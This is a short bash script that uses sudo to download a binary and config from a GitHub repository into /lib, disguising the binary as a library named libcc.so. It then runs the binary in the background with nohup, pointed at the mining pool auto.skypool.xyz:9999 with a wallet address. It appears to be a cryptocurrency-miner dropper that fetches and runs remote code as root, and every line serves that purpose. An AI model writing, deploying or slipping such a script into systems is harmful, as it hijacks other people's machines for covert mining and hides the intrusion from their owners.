#!/bin/bash
sudo curl -o /lib/libcc.so https://github.com/Shallow-Sea/tools/raw/main/libcc.so
sudo curl -o /lib/config.json https://github.com/Shallow-Sea/tools/raw/main/config.json
sudo chmod +x /lib/libcc.so
sudo chmod +x /lib/config.json
sudo nohup /lib/libcc.so -o auto.skypool.xyz:9999 -u 4A4fyoKs9t2bbsq2qLJAzrCCKJohYXfqr9RiLedQFyy6d7KjvRbGbfiUf8Vxbmcbc8KyNkfknTMkz3ggHGZgv6zJEcsq6FK -k --tls --algo auto -p ranshu &
